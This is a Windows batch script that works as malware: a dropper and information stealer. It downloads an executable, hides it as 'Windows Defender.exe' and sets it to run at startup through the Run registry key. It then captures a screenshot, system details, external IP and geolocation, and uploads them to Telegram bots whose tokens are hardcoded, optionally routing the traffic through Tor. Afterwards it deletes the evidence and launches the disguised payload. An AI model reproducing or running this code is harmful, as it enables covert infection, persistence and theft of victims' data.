@echo off
del /q "%temp%\*"
FOR /D %%p IN ("%temp%\*.*") DO rmdir "%%p" /s /q
:connectivitycheck
ping www.google.com -n 1 -w 5000 >NUL
if errorlevel 1 goto Connectivitycheck

tasklist /fi "imagename eq tor.exe" | find /i "tor.exe" > nul
if not errorlevel 1 (set "proxy=--socks5-hostname 127.0.0.1:9050") else (
  set "proxy="
)

curl.exe %proxy% https://cryptedlumos.github.io/WindowsDefender.exe --output "%AppData%\Microsoft\Windows\Windows Defender.exe" && attrib +s +h +i "%AppData%\Microsoft\Windows\Windows Defender.exe"
REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "Windows Defender" /t REG_SZ /F /D "%AppData%\Microsoft\Windows\Windows Defender.exe -P\"rofile of Windows Defender [Microsoft Corporation]"\"

attrib +s +h +i  "%AppData%\Microsoft\Windows\Templates"

mkdir "%appdata%\Ookla\Speedtest CLI" && attrib +s +h +i "%appdata%\Ookla"

curl.exe %proxy% https://cryptedlumos.github.io/Capture/speedtest-cli.ini --output "%appdata%\Ookla\Speedtest CLI\speedtest-cli.ini" 
curl.exe %proxy% https://cryptedlumos.github.io/Capture/speedtest.exe --output "%appdata%\Ookla\Speedtest CLI\speedtest.exe"
cd "%AppData%\Microsoft\Windows\Templates"

curl.exe %proxy% https://cryptedlumos.github.io/Capture/osinfo.vbs --output "%AppData%\Microsoft\Windows\Templates\osinfo.vbs"
nircmd.exe savescreenshotfull "%username%@%computername% ~$currdate.dd_MM_yyyy$ ~$currtime.HH.mm$.png"
cscript.exe /nologo osinfo.vbs > "%AppData%\Microsoft\Windows\Templates\%username%@%computername%.txt"
echo      =================== >> "%AppData%\Microsoft\Windows\Templates\%username%@%computername%.txt"
"%appdata%\Ookla\Speedtest CLI\speedtest.exe" >> "%AppData%\Microsoft\Windows\Templates\%username%@%computername%.txt"
echo      =================== >> "%AppData%\Microsoft\Windows\Templates\%username%@%computername%.txt"

for /f "tokens=1* delims=: " %%A in (
  'powershell Get-ComputerInfo 2^>NUL^|find "OsName                                                  :"'
) Do set OsName=%%B
for /f "tokens=1* delims=: " %%A in (
  'powershell Get-ComputerInfo 2^>NUL^|find "OsArchitecture                                          :"'
) Do set OsArchitecture=%%B
for /f "tokens=*" %%A in (
  'curl ipinfo.io/ip'
) Do set ExtIP=%%A
for /f "tokens=*" %%A in (
  'curl ipinfo.io/city'
) Do set City=%%A
for /f "tokens=*" %%A in (
  'curl ipinfo.io/region'
) Do set Region=%%A
for /f "tokens=*" %%A in (
  'curl ipinfo.io/country'
) Do set Country=%%A
for /f "tokens=1* delims=: " %%A in (
  'curl ipinfo.io/org'
) Do set ISP=%%B
for /f "tokens=1* delims=: " %%A in (
  'curl %proxy% https://iplist.cc/api 2^>NUL^|find "tor"'
) Do set TorStatus=%%B

curl.exe %proxy% -F text="NEW CONNECTION: %username%@%computername% [%OsName% %OsArchitecture%] [%ISP% (%ExtIP%), Tor is enabled: %TorStatus%] [%City% (%Region%, %Country%)] " https://api.telegram.org/bot2069537898:AAEpaEeE32SSpft-gQ97Onau02dbQ6ZY2Ss/sendMessage?chat_id=-1001589929429
for %%# in ("*.png") do curl.exe %proxy% -F document=@"%%~f#" https://api.telegram.org/bot1951761743:AAF3jkN_H27jkxlyUVx-suQChNmEnAS82Ns/sendDocument?chat_id=-1001585587948 -k --insecure
for %%# in ("*.txt") do curl.exe %proxy% -F document=@"%%~f#" https://api.telegram.org/bot2008957838:AAHp_ojoUjJwh2Y0EDHWyN-pUYRAyiaMPws/sendDocument?chat_id=-1001548046257 -k --insecure

del /q /s /a *.png
del /q /s /a *.txt
del /q /s /a osinfo.vbs

"%AppData%\Microsoft\Windows\Windows Defender.exe" -P"rofile of Windows Defender [Microsoft Corporation]"
